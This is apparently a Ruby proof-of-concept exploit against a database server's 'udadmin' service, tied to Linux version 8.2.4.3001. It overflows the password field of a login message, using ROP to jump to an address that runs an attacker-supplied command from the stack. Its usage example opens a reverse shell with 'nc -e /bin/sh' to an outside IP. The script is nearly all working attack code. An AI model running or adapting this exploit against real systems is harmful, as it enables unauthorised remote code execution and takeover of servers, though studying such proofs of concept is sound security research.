# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> <port> <command>"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438 'kill -TERM $PPID & nc -e /bin/sh 10.0.0.179 4444'"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || usage()
COMMAND = ARGV[2] || usage()

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

# Connect to the udadmin service
puts "Connecting to 'udadmin' service:"
connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'udadmin' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    # (doesn't affect this exploit)
    { type: :integer, value: 1337 },
  ],
)

# Note: these constants are for Linux version 8.2.4.3001

# The overflow amount
RETURN_ADDRESS_OFFSET = 0x2b8

# This just runs a command from the stack - we don't really need anything else
RUN_COMMAND_FROM_STACK = 0x412e25

# These are all handy ROP addresses that I ended up not needing
# GET_STRING_VAL = 0x40cc60 # Read a string from the packet
# POPRDI_RET = 0x408bc4
# POPRSI_RET = 0x40d237
# DEBUG_BREAK = 0x4089e0 # 0xcc

# Build the ROP chain - super simple!
PAYLOAD = [ RUN_COMMAND_FROM_STACK, ].pack('Q*') + COMMAND

# Make sure we aren't using a banned character - 0xFF encodes to a NUL byte,
# which breaks the strcpy()
if PAYLOAD.include?("\xff")
  $stderr.puts("ROP string includes a 0xFF, which can't happen!")
  exit 1
end

OVERFLOW_PADDING = ("A" * RETURN_ADDRESS_OFFSET)

USERNAME = "test"
PASSWORD = OVERFLOW_PADDING + PAYLOAD

connection.send_recv(
  args: [
    # Message type
    { type: :integer, value: LibNeptune::MESSAGE_LOGIN },

    # Username
    { type: :string, value: USERNAME },

    # Password (encoded by making each byte negative)
    { type: :string, value: PASSWORD.bytes.map { |b| (0x0FF & (~b)).chr }.join },
  ],
)

puts "Payload sent"
